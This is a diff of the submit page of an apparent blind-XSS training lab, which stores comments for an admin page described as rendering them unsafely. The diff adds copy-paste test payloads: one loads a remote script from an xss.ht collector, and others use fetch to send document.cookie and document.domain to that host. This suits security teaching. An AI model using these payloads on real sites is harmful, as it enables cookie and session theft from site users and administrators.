@@ -1,48 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Blind XSS Lab - Submit</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 30px; }
-        input, textarea { display: block; margin: 10px 0; width: 300px; }
-        label { font-weight: bold; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Blind XSS Lab – Submit</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: Arial, sans-serif; margin: 30px; max-width: 720px; }
+    input, textarea, button { display:block; width:100%; padding:8px; margin:8px 0; }
+    .row { display:grid; grid-template-columns: 1fr; gap:18px; }
+    .card { border:1px solid #eee; padding:14px; border-radius:6px; }
+    code { background:#f6f6f6; padding:2px 4px; border-radius:3px; }
+  </style>
 </head>
 <body>
-    <h1>Submit Comment (Blind XSS Demo)</h1>
-    <form id="commentForm">
-        <label for="name">Name:</label>
-        <input name="name" id="name" type="text" required>
+  <h1>Submit Comment (Blind XSS Demo)</h1>
 
-        <label for="comment">Comment:</label>
-        <textarea name="comment" id="comment" required></textarea>
+  <div class="row">
+    <div class="card">
+      <h3>Method A – JavaScript store (client-side)</h3>
+      <form id="commentForm">
+        <label>Name</label>
+        <input name="name" required>
+        <label>Comment</label>
+        <textarea name="comment" required></textarea>
+        <button type="submit">Submit (store locally)</button>
+      </form>
+      <div id="message"></div>
+      <p>Open <code>login.html</code> → sign in → <code>admin.html</code> to view & trigger payloads.</p>
+    </div>
 
-        <button type="submit">Submit</button>
-    </form>
-    <div id="message"></div>
-    <hr>
-    <p>
-      <b>Note:</b> After submitting, open <code>admin.html</code> in another tab or device to view comments as an "admin" and trigger any blind XSS payloads.
-    </p>
+    <div class="card">
+      <h3>Method B – No-JS GET submit (scanner-friendly)</h3>
+      <form action="admin.html" method="GET">
+        <label>Name</label>
+        <input name="name" required>
+        <label>Comment</label>
+        <textarea name="comment" required></textarea>
+        <button type="submit">Submit to admin.html</button>
+      </form>
+      <p>This sends <code>?name=...&comment=...</code> to <code>admin.html</code>. The admin page stores it and renders unsafely.</p>
+    </div>
+  </div>
 
-    <script>
-    // Store comments in localStorage for demo
+  <hr>
+  <p><b>Test payloads (copy-paste into “Comment”):</b></p>
+  <ul>
+    <li><code>&lt;script src="https://yourname.xss.ht"&gt;&lt;/script&gt;</code></li>
+    <li><code>&lt;img src=x onerror=fetch(`https://yourname.xss.ht?c=`+document.cookie)&gt;</code></li>
+    <li><code>"&gt;&lt;svg/onload=fetch(`https://yourname.xss.ht?d=`+document.domain)&gt;</code></li>
+  </ul>
+
+  <script>
     const form = document.getElementById('commentForm');
-    const message = document.getElementById('message');
+    const msg = document.getElementById('message');
     form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const name = form.name.value;
-        const comment = form.comment.value;
+      e.preventDefault();
+      const name = form.name.value;
+      const comment = form.comment.value;
 
-        // Get existing or create new array
-        let comments = JSON.parse(localStorage.getItem('comments') || "[]");
-        comments.push({ name, comment, time: new Date().toISOString() });
-        localStorage.setItem('comments', JSON.stringify(comments));
+      let comments = JSON.parse(localStorage.getItem('comments') || "[]");
+      comments.push({ name, comment, time: new Date().toISOString() });
+      localStorage.setItem('comments', JSON.stringify(comments));
 
-        message.innerHTML = '<b>Comment submitted!</b> Now view <code>admin.html</code> as admin.';
-        form.reset();
+      msg.innerHTML = '<b>Saved locally.</b> Now sign in at <code>login.html</code> and view <code>admin.html</code>.';
+      form.reset();
     });
-    </script>
+  </script>
 </body>
 </html>
